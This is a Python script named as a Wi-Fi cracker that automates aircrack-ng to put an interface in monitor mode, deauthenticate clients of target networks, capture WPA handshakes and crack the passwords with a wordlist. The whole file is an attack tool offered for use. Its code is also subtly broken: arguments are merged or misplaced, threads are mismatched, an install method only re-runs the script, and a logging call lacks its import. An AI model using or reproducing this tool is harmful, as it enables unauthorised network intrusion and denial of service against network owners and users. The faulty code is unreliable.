import threading
import subprocess
import os
import sys
from collections import namedtuple
from os import execv


class WiFiCracker:
    def __init__(self, interface: str = "en0"):
        self.interface = interface
        if not os.path.exists(f"{interface}.monitor"):
            self.start_interface()
            self.create_monitor_mode()

    def start_interface(self):
        command = ["ifconfig", self.interface, "up"]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if error:
            raise Exception("Error:", error.decode())

    def create_monitor_mode(self):
        command = ["airmon-ng", "start", self.interface]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if error:
            raise Exception("Error:", error.decode())

    def deauth_attack(self, bssid):
        command = ["aireplay-ng", "--deauth", f"100 -a {bssid}", self.interface + ".monitor"]
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if error:
                raise Exception("Error:", error.decode())
        except FileNotFoundError as e:
            print("Aircrack-ng not found. Please install it.")
            raise

    def handshake_capture(self, bssid):
        command = ["airodump-ng", "--bssid", bssid, "--channel", "6", f"{self.interface}.monitor", "-w", f"{bssid}_handshake"]
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if error:
                raise Exception("Error:", error.decode())

            result = process.returncode
            if result != 0:
                raise Exception(f"Failed to capture handshake for BSSID {bssid}")
        except FileNotFoundError as e:
            print("Aircrack-ng not found. Please install it.")
            raise

    def crack_wpa(self, bssid, capfile):
        command = ["aircrack-ng", "-w", "wordlist.txt", f"{capfile}", bssid]
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if error:
                raise Exception("Error:", error.decode())

            result = process.returncode
            if result == 0:
                print(f"Successfully cracked password for BSSID {bssid}")
            else:
                print(f"Failed to crack password for BSSID {bssid}")
        except FileNotFoundError as e:
            print("Aircrack-ng not found. Please install it.")
            raise

    def run(self, bssids):
        threads = []
        for bssid in bssids:
            deauth_thread = threading.Thread(target=self.deauth_attack, args=(bssid,))
            capture_thread = threading.Thread(target=self.handshake_capture, args=(bssid,))
            crack_thread = threading.Thread(target=self.crack_wpa, args=(bssid, f"{bssid}_handshake",))
            threads.append((deauth_thread, capture_thread, crack_thread))

        for deauth_thread, capture_thread, crack_thread in zip(*threads):
            deauth_thread.start()
            capture_thread.start()
            deauth_thread.join()
            capture_thread.join()
            crack_thread.start()

    def _install_from_brew(self)->bool:
        """
        Installs all tools or validate that they are installed
        :return: True if all is good, False otherwise
        """
        try:
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception as e:
            logging.error(f'Error installing tools: {e}")')



if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python wifi_cracker.py bssid1 [bssid2 ...]")
        sys.exit(1)

    bssids = [x.strip() for x in sys.argv[1:]]
    wifi_cracker = WiFiCracker("en0")
    wifi_cracker.run(bssids)
